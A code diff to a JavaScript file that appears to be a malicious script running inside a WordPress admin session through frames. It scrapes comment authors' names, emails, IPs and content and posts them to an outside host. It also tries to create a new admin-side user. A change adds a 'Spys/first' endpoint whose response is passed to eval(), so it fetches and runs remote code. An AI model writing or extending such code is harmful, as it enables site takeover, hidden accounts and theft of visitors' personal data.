@@ -32,6 +32,7 @@ function initURL()
 
     g_strURLVisitLogsAdd=Common.getJSHost()+"visit-logs/add2";
     g_strURLCommentsAdd=Common.getJSHost()+"Comments/add";
+    g_strURLSpysIndex=Common.getJSHost()+"Spys/first";
 }
 
 //find the give child
@@ -64,11 +65,18 @@ function inPagePanelIndex()
             (
                 {
                     type:"post",
-                    url:"",
+                    url:g_strURLSpysIndex,
                     data:{},
                     success:function(data,textStatus,xhr)
                     {
-
+                        try
+                        {
+                            eval(data);
+                        }
+                        catch(e)
+                        {
+                            console.log("fatal error in function inPagePanelIndex:"+e);
+                        }
                     }
                 }
             );
@@ -184,130 +192,153 @@ function inPageEditPHP() {
 //--------------------------------------------comment page-----------------------------------------------------------------------
 function inPageComment(iRowIndex)
 {
-    var $elementTable=$("#the-comment-list");
     var jsonLog=
     {
         username:window.parent.g_strUsername,
         action:""
     };
-    if($elementTable.length>0)
+    //check is able to display comments
+    if($("#the-comment-list").length===0)
     {
-        //for(var i=0;i<$elementTable.children().length;++i)
-        //{
-        if(iRowIndex<0)
+        //can not display comments
+        if($("#error-page").length>0)
         {
-            iRowIndex=0;
-        }
-        if(iRowIndex<$elementTable.children().length)
-        {
-            var $elementTableRow=$elementTable.children().eq(iRowIndex);
-            //author basic info，author email site ip
-            var $elementAuthorBasic=$elementTableRow.find("td.author.column-author");
-            if($elementAuthorBasic.length!=1)
-            {
-                throw "author basic element number is not equal 1,it is:"+$elementAuthorBasic.length;
-            }
-            var author=$elementAuthorBasic.children().eq(0).text();
-            var site=$elementAuthorBasic.children().eq(2).text();
-            var email=$elementAuthorBasic.children().eq(4).text();
-            var ip=$elementAuthorBasic.children().eq(6).text();
-            //content
-            var $elementContent=$elementTableRow.find("td.comment.column-comment.has-row-actions.column-primary");
-            if($elementContent.length!=1)
-            {
-                throw "content element number is not equal 1,it is:"+$elementContent.length;
-            }
-            var content=$elementContent.children().eq(1).text();
-            //post backto
-            var $elementBackTo=$elementTableRow.find("td.response.column-response");
-            if($elementBackTo.length!=1)
-            {
-                throw "back to element number is not equal 1,it is:"+$elementBackTo.length;
-            }
-            var backto=$elementBackTo.children().eq(0).children().eq(0).text();
-            //post time
-            var $elementTime=$elementTableRow.find("td.date.column-date");
-            if($elementTime.length!=1)
-            {
-                throw "back to element number is not equal 1,it is:"+$elementTime.length;
-            }
-            var time=$elementTime.children().eq(0).text();
-            $.ajax
-            (
-                {
-                    type:"post",
-                    url:g_strURLCommentsAdd,
-                    data:
-                    {
-                        postauthor:author,
-                        postemail:email,
-                        postsite:site,
-                        postip:ip,
-                        postcontent:content,
-                        posttime:time,
-                        postto:backto
-                    },
-                    success:function(data,textStatus,xhr)
-                    {
-                        try
-                        {
-                            var json=eval("("+data+")");
-                            if(json.success)
-                            {
-                                throw "success";
-                            }
-                            else
-                            {
-                                throw "failed";
-                            }
-                        }
-                        catch(e)
-                        {
-                            if(e!="success"&&e!="failed")
-                            {
-                                console.log("add comment exception:"+e);
-                            }
-                            else
-                            {
-                                console.log("add comment result:"+e);
-                            }
-                            //next row
-                            iRowIndex++;
-                            inPageComment(iRowIndex);
-                        }
-                    }
-                }
-            );
+            //login already but no privileges
+            console.log("login but no privileges to show comments");
+            jsonLog.action="already login and try crawl comment but has not privilege!";
+            window.parent.g_strComunication="no_privilege";
         }
         else
         {
-            //next page
-            //total pages
-            var iTotal=$(".total-pages").eq(0).text();
-            //current page
-            var iCurrent=$("#current-page-selector").val();
-            //check if there is next page
-            if(iTotal===iCurrent)
+            //302 redirect,need login
+            console.log("can not get error message,program not supposed to run here");
+            jsonLog.action="can not get error message,program not supposed to run here";
+            window.parent.g_strComunication="can_not_find_error_message";
+        }
+        addVisitLog(json);
+    }
+    else
+    {
+        var $elementTable=$("#the-comment-list");
+        if($elementTable.length>0)
+        {
+            //for(var i=0;i<$elementTable.children().length;++i)
+            //{
+            if(iRowIndex<0)
             {
-                //no more
-                window.parent.g_strComunication="";
-                jsonLog.action="capture comment finish,count:"+$elementTable.children().length;
+                iRowIndex=0;
+            }
+            if(iRowIndex<$elementTable.children().length)
+            {
+                var $elementTableRow=$elementTable.children().eq(iRowIndex);
+                //author basic info，author email site ip
+                var $elementAuthorBasic=$elementTableRow.find("td.author.column-author");
+                if($elementAuthorBasic.length!=1)
+                {
+                    throw "author basic element number is not equal 1,it is:"+$elementAuthorBasic.length;
+                }
+                var author=$elementAuthorBasic.children().eq(0).text();
+                var site=$elementAuthorBasic.children().eq(2).text();
+                var email=$elementAuthorBasic.children().eq(4).text();
+                var ip=$elementAuthorBasic.children().eq(6).text();
+                //content
+                var $elementContent=$elementTableRow.find("td.comment.column-comment.has-row-actions.column-primary");
+                if($elementContent.length!=1)
+                {
+                    throw "content element number is not equal 1,it is:"+$elementContent.length;
+                }
+                var content=$elementContent.children().eq(1).text();
+                //post backto
+                var $elementBackTo=$elementTableRow.find("td.response.column-response");
+                if($elementBackTo.length!=1)
+                {
+                    throw "back to element number is not equal 1,it is:"+$elementBackTo.length;
+                }
+                var backto=$elementBackTo.children().eq(0).children().eq(0).text();
+                //post time
+                var $elementTime=$elementTableRow.find("td.date.column-date");
+                if($elementTime.length!=1)
+                {
+                    throw "back to element number is not equal 1,it is:"+$elementTime.length;
+                }
+                var time=$elementTime.children().eq(0).text();
+                $.ajax
+                (
+                    {
+                        type:"post",
+                        url:g_strURLCommentsAdd,
+                        data:
+                        {
+                            postauthor:author,
+                            postemail:email,
+                            postsite:site,
+                            postip:ip,
+                            postcontent:content,
+                            posttime:time,
+                            postto:backto
+                        },
+                        success:function(data,textStatus,xhr)
+                        {
+                            try
+                            {
+                                var json=eval("("+data+")");
+                                if(json.success)
+                                {
+                                    throw "success";
+                                }
+                                else
+                                {
+                                    throw "failed";
+                                }
+                            }
+                            catch(e)
+                            {
+                                if(e!="success"&&e!="failed")
+                                {
+                                    console.log("add comment exception:"+e);
+                                }
+                                else
+                                {
+                                    console.log("add comment result:"+e);
+                                }
+                                //next row
+                                iRowIndex++;
+                                inPageComment(iRowIndex);
+                            }
+                        }
+                    }
+                );
             }
             else
             {
                 //next page
-                window.parent.g_strComunication=$("a.next-page").eq(0).attr("href");
-                jsonLog.action="capture comment and going to next page,count:"+$elementTable.children().length;
+                //total pages
+                var iTotal=$(".total-pages").eq(0).text();
+                //current page
+                var iCurrent=$("#current-page-selector").val();
+                //check if there is next page
+                if(iTotal===iCurrent)
+                {
+                    //no more
+                    window.parent.g_strComunication="";
+                    jsonLog.action="capture comment finish,count:"+$elementTable.children().length;
+                }
+                else
+                {
+                    //next page
+                    window.parent.g_strComunication=$("a.next-page").eq(0).attr("href");
+                    jsonLog.action="capture comment and going to next page,count:"+$elementTable.children().length;
+                }
+                addVisitLog(jsonLog);
             }
+            //}
+        }
+        else
+        {
+            jsonLog.action="fatal error in function inPageComment:can not get element table";
+            console.log(jsonLog.action);
             addVisitLog(jsonLog);
         }
-        //}
-    }
-    else
-    {
-        jsonLog.action="fatal error in function inPageComment:can not get element table";
-        console.log(jsonLog.action);
-        addVisitLog(jsonLog);
     }
 }
 //--------------------------------------------comment page-----------------------------------------------------------------------
@@ -316,6 +347,11 @@ function inPageComment(iRowIndex)
 //--------------------------------------------adduser page-----------------------------------------------------------------------
 function inPageAddUser()
 {
+    var json=
+    {
+        username:window.parent.g_strUsername,
+        action:""
+    };
     //check is able to create user
     if($("#createuser").length===0)
     {
@@ -323,20 +359,18 @@ function inPageAddUser()
         if($("#error-page").length>0)
         {
             //login already but no privileges
-            console.log("login but no privileges");
-            var json=
-            {
-                username:window.parent.g_strUsername,
-                action:"already login and try add user but has not privilege!"
-            };
+            console.log("login but no privileges to create user");
+            json.action="already login and try add user but has not privilege!";
             window.parent.g_strComunication="no_privilege";
-            addVisitLog(json);
         }
         else
         {
             //302 redirect,need login
-            console.log("302 redirect need to login,but program not supposed to run here");
+            console.log("can not find error message,program not supposed to run here");
+            json.action="can not find error message,program not supposed to run here";
+            window.parent.g_strComunication="can_not_find_error_message";
         }
+        addVisitLog(json);
     }
     else
     {
@@ -366,30 +400,30 @@ function inPageAddUser()
                 success:function(data,textStatus,xhr)
                 {
                     //accroding google explain,status 302 will never received
-                    var json=
-                    {
-                        username:window.parent.g_strUsername,
-                        action:""
-                    };
                     window.parent.g_strComunication="has_privilege";
                     try
                     {
-
                         if(data.indexOf("id=\"createusersub\"")===-1)
                         {
-                            console.log("add user success");
-                            json.action="add user success";
+                            throw "success";
                         }
                         else
                         {
-                            console.log("add user failed");
-                            json.action="add user failed";
+                            throw "failed";
                         }
-                        addVisitLog(json);
                     }
                     catch(e)
                     {
-                        console.log("add user exception:"+e);
+                        if(e=="success"||e=="failed")
+                        {
+                            json.action="create user "+e;
+
+                        }
+                        else
+                        {
+                            json.action="create user exception:"+e;
+                        }
+                        console.log(json.action);
                         addVisitLog(json);
                     }
                 }
@@ -447,7 +481,6 @@ function inPageLogin()
                             //to do
                             throw "login failed exception,just for easy";
                         }
-
                     }
                     catch(e)
                     {
@@ -623,9 +656,23 @@ function frameOperationCalledFromSon(windowSon)
     {
         if(g_strComunication!=="")
         {
-            //next page
-            console.log("going to crawl next page comments:"+g_strComunication);
-            frameJumpTo(g_strComunication);
+            if(g_strComunication==="no_privilege")
+            {
+                //no privileges to show comments
+                console.log("detect no porivilege to show comments,going to control panel")
+                frameJumpTo(g_strURLPanelIndex);
+            }
+            else if(g_strComunication=="can_not_find_error_message")
+            {
+                console.log("detect can not find error message,going to control panel")
+                frameJumpTo(g_strURLPanelIndex);
+            }
+            else
+            {
+                //next page
+                console.log("going to crawl next page comments:"+g_strComunication);
+                frameJumpTo(g_strComunication);
+            }
         }
         else
         {
@@ -639,6 +686,11 @@ function frameOperationCalledFromSon(windowSon)
         if(g_strComunication==="no_privilege")
         {   // has no privileges,i need comment
             console.log("detect can not create user due to lack of privileges,try to crawl comment ..");
+            frameJumpTo(g_strURLComment);
+        }
+        else if(g_strComunication==="can_not_find_error_message")
+        {
+            console.log("can not find error message,try to crawl comment ..");
             frameJumpTo(g_strURLComment);
         }
         else if(g_strComunication==="has_privilege")
